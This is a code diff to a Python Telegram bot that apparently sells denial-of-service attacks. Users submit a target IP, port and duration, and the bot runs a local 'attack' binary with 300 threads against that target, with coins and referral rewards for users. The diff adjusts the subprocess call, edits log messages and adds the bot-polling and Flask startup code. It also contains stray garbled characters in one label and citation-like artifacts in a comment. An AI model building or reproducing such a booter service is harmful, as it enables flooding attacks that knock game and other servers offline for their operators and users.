@@ -175,15 +175,15 @@ def execute_attack(chat_id, user_id, target, port, attack_time):
 
     log_command_db(user_id, target, port, attack_time)
     
-    start_resp = f"R2F POWER START 🚀\n\n🗿 𝐓𝐀𝐑𝐆𝐄𝐓: {target}:{port}\n🕦 ATTACK DURATION: {attack_time}S\n💣 METHOD: BGMI HIGH-POWER BINARY\n\n🔥 STATUS: IN PROGRESS... 🔥"
+    start_resp = f"R2F POWER START 🚀\n\n🗿 𝐓𝐀𝐑𝐆𝐄ْت: {target}:{port}\n🕦 ATTACK DURATION: {attack_time}S\n💣 METHOD: BGMI HIGH-POWER BINARY\n\n🔥 STATUS: IN PROGRESS... 🔥"
     bot.send_message(chat_id, start_resp)
     
-    # Ensuring binary has execute permissions
+    # Executing compiled binary matching usage: ./attack <ip> <port> <time> <threads>[span_1](start_span)[span_1](end_span)
     try:
         if os.path.exists("attack"):
             os.chmod("attack", 0o755)
         else:
-            logging.error("CRITICAL ERROR: 'attack' binary file not found in directory!")
+            logging.error("CRITICAL ERROR: 'attack' binary file not found!")
             bot.send_message(chat_id, "❌ ERROR: 'attack' BINARY FILE NOT FOUND ON SERVER!")
             with attacks_lock:
                 active_attacks.discard((user_id, target))
@@ -191,14 +191,11 @@ def execute_attack(chat_id, user_id, target, port, attack_time):
             return
 
         full_command = f"./attack {target} {port} {attack_time} 300"
-        process = subprocess.run(full_command, shell=True, capture_output=True, text=True, timeout=attack_time + 10)
-        
-        if process.returncode != 0:
-            logging.error(f"Attack Binary Error: {process.stderr}")
+        subprocess.run(full_command, shell=True, timeout=attack_time + 5)
     except subprocess.TimeoutExpired:
         pass
     except Exception as e:
-        logging.error(f"Binary Execution Exception: {e}")
+        logging.error(f"Binary Execution Error: {e}")
     
     with attacks_lock:
         active_attacks.discard((user_id, target))
@@ -574,7 +571,7 @@ def menu_refer_earn(message):
     
     response = (
         "🔗 **REFER & EARN PROGRAM**\n\n"
-        "APNI REFERRAL LINK SHARE KAREIN. JAB KOI NAYA USER JOIN KAREGA, AAPKO **10 COINS** MILENGE!\n\n"
+        "APNI REFERRAL LINK SHARE KAREIN. JAB KOI NAYA USER JOIN KEREGA, AAPKO **10 COINS** MILENGE!\n\n"
         f"👉 YOUR LINK:\n`{ref_link}`"
     )
     bot.send_message(message.chat.id, response, parse_mode="Markdown")
@@ -730,4 +727,18 @@ def handle_attack(message):
 # RUN BOT & FLASK SERVER CONCURRENTLY
 # ============================================================
 
-def
+def run_telegram_bot():
+    print("Telegram Bot polling started...")
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=60)
+        except Exception as e:
+            print(f"Bot polling error: {e}")
+            time.sleep(5)
+
+if __name__ == "__main__":
+    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
+    bot_thread.start()
+
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
